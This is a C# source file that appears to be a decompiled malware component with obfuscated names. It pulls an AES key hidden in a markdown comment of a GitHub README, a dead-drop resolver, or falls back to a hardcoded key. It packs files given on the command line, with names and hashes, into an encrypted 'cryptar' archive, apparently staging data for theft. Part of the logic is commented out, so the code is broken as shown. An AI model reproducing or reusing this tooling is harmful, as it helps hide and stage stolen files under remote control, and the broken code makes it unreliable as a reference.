// Namespace_1.Class_1
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Web;
//using System.Web.Script.Serialization;

public class Helper
{
    public static byte[] Field_0;

    public static byte[] Field_1;

    public static byte[] Field_2;

    public string Field_3;

    public string[] Field_4;

    public MemoryStream Field_5;

    public byte[] Field_6;

    public byte[] Field_7;

    public byte[] Field_8;

    static Helper()
    {
        Field_0 = Encoding.ASCII.GetBytes("20180203");
        Field_1 = Convert.FromBase64String("gPzN1l7iiLssQ2T760buzg==");
        Field_2 = Convert.FromBase64String("gPzN1l7iiLssQ2T760buzg==");
    }

    public static void Method_0(Stream Param_0, Stream Param_1)
    {
        byte[] array = new byte[32768];
        int count;
        while ((count = Param_0.Read(array, 0, array.Length)) > 0)
        {
            Param_1.Write(array, 0, count);
        }
    }

    public Helper(string[] Param_0)
    {
        Field_3 = Param_0[0];
        Field_4 = new string[Param_0.Length - 1];
        Array.Copy(Param_0, 1, Field_4, 0, Param_0.Length - 1);
        Field_5 = new MemoryStream();
    }

    public bool Method_1(string Param_0)
    {
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Param_0);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36";
        HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        if (httpWebResponse.StatusCode == HttpStatusCode.OK)
        {
            Encoding aSCII = Encoding.ASCII;
            string param_ = default(string);
            using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), aSCII))
            {
                param_ = streamReader.ReadToEnd();
            }
            Method_3(param_);
        }
        if (Field_6 == null)
        {
            Console.WriteLine("Failed to load remote data");
            Method_4();
        }
        httpWebResponse.Close();
        return true;
    }

    public string Method_2(string Param_0)
    {
        string text = "[//]: # (";
        string value = ")";
        using (StringReader stringReader = new StringReader(Param_0))
        {
            string empty = string.Empty;
            do
            {
                empty = stringReader.ReadLine();
                if (empty != null && empty.StartsWith(text))
                {
                    int num = empty.IndexOf(value, text.Length);
                    if (num > 0)
                    {
                        return empty.Substring(text.Length, num - text.Length);
                    }
                }
            }
            while (empty != null);
        }
        return null;
    }

    public bool Method_3(string Param_0)
    {
        string text = Method_2(Param_0);
        if (text == null)
        {
            return false;
        }
        if (text.Length < 8)
        {
            return false;
        }
        Field_8 = Encoding.ASCII.GetBytes(text.Substring(0, 8));
        byte[] array = Convert.FromBase64String(text.Substring(8));
        if (array.Length != 32)
        {
            return false;
        }
        Field_6 = new byte[16];
        Field_7 = new byte[16];
        Array.Copy(array, 0, Field_6, 0, 16);
        Array.Copy(array, 16, Field_7, 0, 16);
        if (Field_8.Length != 8)
        {
         
            throw new ArgumentException("1");
        }
        if (Field_6.Length != 16)
        {
            throw new ArgumentException("2");
        }
        if (Field_7.Length != 16)
        {
            throw new ArgumentException("3");
        }
        Console.WriteLine(BitConverter.ToString(Field_6));
        return true;
    }

    public bool Method_4()
    {
        Field_8 = Field_0;
        Field_6 = Field_1;
        Field_7 = Field_2;
        if (Field_8.Length != 8)
        {
            throw new ArgumentException("1");
        }
        if (Field_6.Length != 16)
        {
            throw new ArgumentException("2");
        }
        if (Field_7.Length != 16)
        {
            throw new ArgumentException("3");
        }
        return true;
    }

    public byte[] DecMethod_5()
    {
        Field_5.Seek(0L, SeekOrigin.Begin);
        using (Aes aes = Aes.Create())
        {
            aes.KeySize = 256;
            aes.Key = Field_6;
            aes.IV = Field_7;
            aes.Padding = PaddingMode.PKCS7;

//            aes.Padding = PaddingMode.None;
            aes.Mode = CipherMode.CBC;
            ICryptoTransform transform = aes.CreateDecryptor();
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    byte[] array = Field_5.ToArray();
                    cryptoStream.Write(array, 0, array.Length);
                }
                return memoryStream.ToArray();
            }
        }
    }

    public byte[] Method_5()
    {
        Field_5.Seek(0L, SeekOrigin.Begin);
        using (Aes aes = Aes.Create())
        {
            aes.KeySize = 256;
            aes.Key = Field_6;
            aes.IV = Field_7;
            aes.Padding = PaddingMode.PKCS7;
            aes.Mode = CipherMode.CBC;
            ICryptoTransform transform = aes.CreateEncryptor();
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    byte[] array = Field_5.ToArray();
                    cryptoStream.Write(array, 0, array.Length);
                }
                return memoryStream.ToArray();
            }
        }
    }

    public bool Method_6(string Param_0)
    {
        Console.WriteLine("Adding file {0}", Param_0);
        byte[] array = File.ReadAllBytes(Param_0);
        byte[] array2 = default(byte[]);
        using (SHA256 sHA = SHA256.Create())
        {
            array2 = sHA.ComputeHash(array);
        }
        long value = array.Length;
        byte[] bytes = BitConverter.GetBytes(value);
        byte[] bytes2 = Encoding.UTF8.GetBytes(Param_0);
        byte[] bytes3 = BitConverter.GetBytes(bytes2.Length);
        Field_5.Write(bytes3, 0, bytes3.Length);
        Field_5.Write(bytes2, 0, bytes2.Length);
        Field_5.Write(array2, 0, array2.Length);
        Field_5.Write(bytes, 0, bytes.Length);
        Field_5.Write(array, 0, array.Length);
        return true;
    }

    public string Method_7(string Param_0)
    {
        string[] array = Param_0.Split('/');
        string arg = array[3];
        string arg2 = array[4];
        int num = Param_0.IndexOf("master/");
        if (num < 0)
        {
            throw new ArgumentException("4");
        }
        string arg3 = Param_0.Substring(num + "master/".Length);
        string requestUriString = $"https://api.github.com/repos/{arg}/{arg2}/contents/{arg3}";
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36";
        HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        if (httpWebResponse.StatusCode == HttpStatusCode.OK)
        {
            Encoding aSCII = Encoding.ASCII;
            string input = default(string);
            using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), aSCII))
            {
                input = streamReader.ReadToEnd();
            }
            Console.WriteLine(requestUriString);
           // JavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();
           // Dictionary<string, object> dictionary = javaScriptSerializer.Deserialize<Dictionary<string, object>>(input);
           // return (string)dictionary["download_url"];
        }
        throw new WebException("5");
    }

    public bool Method_8()
    {
        string param_ = "https://github.com/johnsmith2121/react/blob/master/README.md";
        string text = Method_7(param_);
        if (text == null)
        {
            return false;
        }
        Method_1(text);
        string[] field_ = Field_4;
        foreach (string param_2 in field_)
        {
            Method_6(param_2);
        }
        byte[] array = Method_5();
        using (FileStream fileStream = File.Open(Field_3, FileMode.Create))
        {
            byte[] bytes = Encoding.ASCII.GetBytes("cryptar");
            fileStream.Write(bytes, 0, bytes.Length);
            fileStream.Write(Field_8, 0, Field_8.Length);
            fileStream.Write(array, 0, array.Length);
        }
        return true;
    }
}
